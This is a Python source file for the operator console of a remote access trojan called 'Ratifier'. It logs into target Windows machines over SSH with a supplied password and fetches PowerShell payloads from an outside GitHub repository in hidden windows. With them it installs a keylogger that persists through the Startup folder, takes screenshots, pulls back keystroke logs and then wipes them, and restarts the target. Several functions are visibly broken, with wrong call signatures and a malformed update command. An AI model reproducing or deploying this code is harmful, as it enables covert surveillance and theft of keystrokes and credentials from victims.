#!/usr/bin/python
# python console for Ratifier
# created by: RAT

# imports
import os
import sys
import random as r
from datetime import datetime
import getpass
from modules import *

# variables
banner = """

 /$$$$$$$              /$$     /$$  /$$$$$$  /$$                    
| $$__  $$            | $$    |__/ /$$__  $$|__/                    
| $$  \ $$  /$$$$$$  /$$$$$$   /$$| $$  \__/ /$$  /$$$$$$   /$$$$$$ 
| $$$$$$$/ |____  $$|_  $$_/  | $$| $$$$    | $$ /$$__  $$ /$$__  $$
| $$__  $$  /$$$$$$$  | $$    | $$| $$_/    | $$| $$$$$$$$| $$  \__/
| $$  \ $$ /$$__  $$  | $$ /$$| $$| $$      | $$| $$_____/| $$      
| $$  | $$|  $$$$$$$  |  $$$$/| $$| $$      | $$|  $$$$$$$| $$      
|__/  |__/ \_______/   \___/  |__/|__/      |__/ \_______/|__/

            [::] The RAT You'll Ever Need [::]
                [::] Created by: RAT [::]
"""
help_menu = """
        Arguments:
            -t <ipaddress>    = run RAT on target IP address
            -f <config file>  = run RAT on config file from installer
            XXX.rat = configuration file to add to Ratifier

        Example:
            python3 main.py -t 127.128.1.23
            python3 main.py -f config_file.rat
            python3 main.py config_file.rat
"""
options_menu = """
        [+] Payload:
            [0] - Remote Console
            [1] - Install Keylogger
            [2] - Grab Keylogs
            [3] - Install ScreenCapture
            [4] - Take Screenshot
            [5] - Restart Target PC

        [+] Options:
            [h] or [help]    -- Help Menu
            [c] or [config]  -- Display RAT File
            [v] or [version] -- Version Number
            [u] or [update]  -- Update Ratifier
            [r] or [remove]  -- Remove Ratifier
            [q] or [quit]    -- Quit

            * any other command will be
              sent through your terminal

        [+] Select an [option] ...

"""
username = getpass.getuser() # gets username
header = f"{username}@winlocal $ " # sets up user input interface
remote_path = "https://github.com/gozen-foto/zebroy/tree/main" # url path for Ratifier files
local_path = f"/home/{username}/.ratifier" if username != "root" else f"/root/.ratifier" # gets path of Ratifier

# random text generator for obuscation
def random_text(length=5):
    lower_case = "abcdefghijklmnopqrstuvwxyz"
    upper_case = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

    characters = lower_case + upper_case
    generated_text = ""

    for i in range(length):
        generated_text += r.choice(list(characters))

    return generated_text

# read config file
def read_config(config_file):
    configuration = {}

    # get file contents
    read_lines = open(config_file, "r").readlines()

    # get target configuration
    configuration["IPADDRESS"] = read_lines[0].strip()
    configuration["PASSWORD"] = read_lines[1].strip()
    configuration["WORKINGDIRECTORY"] = (read_lines[2]).replace("\\", "/").strip()
    configuration["STARTUPDIRECTORY"] = (read_lines[3]).replace("\\", "/").strip()

    return configuration

# display configuration file data
def print_config(configuration):

    for key, value in configuration.items():
        print(f"{key}: {value}")

# clear screen
def clear():
    os.system("clear")

# terminate program
def exit():
    print("\n[+] Exiting ... ")
    sys.exit()

# gets current date and time
def current_date():
    current = datetime.now()

    return current.strftime("%Y-%m-%d %H:%M:%S")
    
# connects rat to target
def connect(address, password):
    print("\n[*] Connecting to target ... ")
    # remotely connect
    os.system(f"sshpass -p \"{password}\" ssh winlocal@{address}")

# remote uploads with SCP
def remote_upload(address, password, upload_file, path):
    print("\n[*] Uploading file ... ")
    # scp upload
    os.system(f"sshpass -p \"{password}\" scp {upload_file} winlocal@{address}:{path}")
    print("\n[+] upload complete\n")

# remote downloads with SCP
def remote_download(address, password, download_file, path):
    print("\n[*] Downloading file ... ")
    # scp download
    os.system(f"sshpass -p \"{password}\" scp winlocal@{address}:{download_file} {path}{local_path}")
    print("\n[+] download complete\n")

# run commands remotely with SCP
def remote_command(address, password, command):
    # remote command execution
    os.system(f"sshpass -p \"{password}\" ssh winlocal@{address} \"{command}\"")

# keylogger
def keylogger(address, password, startup_directory, working_directory, target_username):

    print("\n [*] Prepping keylogger ... ")
    # web requests
    keylogger_command = f"powershell powershell.exe -Windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/keylogger.ps1 -OutFile {working_directory}/p.ps1\""
    # scheduler_command = f"powershell powershell.exe -Windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/scheduler.ps1 -OutFile {working_directory}/i.ps1\""
    controller_command = f'cd C:/Users/{target_username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && powershell powershell.exe -Windowstyle hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/controller.cmd -OutFile controller.cmd'
    # execute_keylogger = f"cd C:/Users/{target_username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && powershell powershell.exe -Windowstyle hidden ./controller.cmd"
    print("\n[+] Keylogger prepped")

    # remote command execution
    print("\n[*] Installing keylogger ... ")
    remote_command(address, password, keylogger_command)
    # print("\n[*] Installing scheduler ... ")
    # remote_command(address, password, scheduler_command)
    print("\n[*] Installing controller ... ")
    remote_command(address, password, controller_command)
    print("\n[+] Keylogger Installed successfully\n")

    # execute logger
    print("\n[!] Restart target PC to execute keylogger ... \n")

    # execute keylogger
    # print("\n[+] Executing keylogger ... ")
    # remote_command(address, password, execute_keylogger)

# screenshots
def screenshot(address, password, working_directory, target_username):
    print("\n[*] Taking screenshot ... ")
    # web request
    screenshot_command = f"powershell powershell.exe -Windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/screenshot.ps1 -OutFile ~/screenshot.ps1\""
    remote_command(address, password, screenshot_command)
    print("\n[+] Screenshot taken successfully\n")

# update Ratifier
def update():

    print("\n[+] Checking for updates ... ")

    # get latest version number
    os.system(f"curl git pull") # need a look

    # save latest version number to memory
    current_version = float(open(f"{local_path}/version.txt", "r").read().strip())
    latest_version = float(open(f"{local_path}/latest.txt", "r").read().strip())

    # compare versions
    if latest_version > current_version:
        print("\n[+] Update found")
        print("[*] Update Ratifier? [y/n]\n")

        # user input, option
        option = input(f"{header}")

        # update Ratifier
        if option == "y" or option == "yes":
            os.system(f"sh ~/.ratifier/payloads/update.sh")
            print("\n[+] Ratifier updated successfully")

        # exception
        else:
            main()

    # otherwise, run main code
    else:
        print("\n[+] Ratifier already up to date")
        print("\n[*] Hit any key to continue ... \n")
        input(f"{header}")
        main()

# unstalls Ratifier
def remove():
    # confirmation
    print("\n[!] Are you sure you want to remove Ratifier? [y/n]\n")

    # user input
    option = input(f"{header}")

    # delete Ratifier
    if option == "y" or option == "yes":
        os.system(f"rm -rf ~/.ratifier")
    
    # cancel
    elif option == "n" or option == "no":
        main()

# command line interface
def cli(arguments):
    # display banner
    print(banner)

    # if arguments exist
    if arguments:
        print(options_menu)

        option = input(f"{header}")

        try:
            configuration = read_config(sys.argv[1])

        except FileNotFoundError:
            print("\n[!!] File does not exist [!!]")
            exit()

        # get config info
        ipv4 = configuration("IPADDRESS")
        password = configuration("PASSWORD")
        working_directory = configuration.get("WORKINGDIRECTORY")
        startup_directory = configuration.get("STARTUPDIRECTORY")
        target_username = working_directory[9:-19] # gets username from working directory

        # remote console
        if option == "0":
            connect(ipv4, password)

        # keelogger
        elif option == "1":
            keylogger(ipv4, password, startup_directory, working_directory, target_username)

        # grab keylogs option
        elif option == "2":
            remote_download(ipv4, password, f"{working_directory}/{target_username}.log")
            remote_command(ipv4, password, f"powershell New-Item -Path {working_directory}/{target_username}.log -ItemType File -Force")

            print("[+] Log file saved to \"~/Downloads\"")
            print("[+] Log file on target has been wiped\n")

        # install screen capture option
        elif option == "3":
            install_screencapture = f"powershell powershell.exe -Windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/screenshot.ps1 -OutFile {working_directory}/screenshot.ps1\""

            screenshot(ipv4, password, install_screencapture)

        # take screenshot option
        elif option == "4":
            take_screenshot = f"./{working_directory}/screenshot.ps1\""
            remote_command(ipv4, password, take_screenshot)

            # download screenshot
            screenshot_location = f"{working_directory}/screenshot.png"
            remote_download(ipv4, password, screenshot_location)

            # rename screenshot to appropriate title

        # restart target option
        elif option == "5":
            remote_command(ipv4, password, "shutdown /r /t 0")
            

        # help me
        elif option == "h" or option == "help":
            main()

        # display config file info
        elif option == "c" or option == "config":
            print_config(configuration)
            print(f"USERNAME: {target_username}")
        
        # get version number
        elif option == "v" or option == "version":
            os.system(f"cat {local_path}/version.txt")

        # update option
        elif option == "u" or option == "update":
            os.system(f"cd {local_path} && git pull")

        # remove installation
        elif option == "r" or option == "remove" or option == "uninstall":
            remove()

        # quit option
        elif option == "q" or option == "quit" or option == "exit":
            exit()

        # exception
        else:
            os.system(option)

        # new line for cleaner UI
        print("\n")

    # if arguments don't exist
    else:
        print(help_menu)

# main code
def main():
    # checks for arguments
    try:
        sys.argv[1]
    except IndexError:
        arguments_exist = False
    else:
        arguments_exist = True
    
    # run command line interface
    cli(arguments_exist)

# run main code
if __name__ == "__main__":
    main()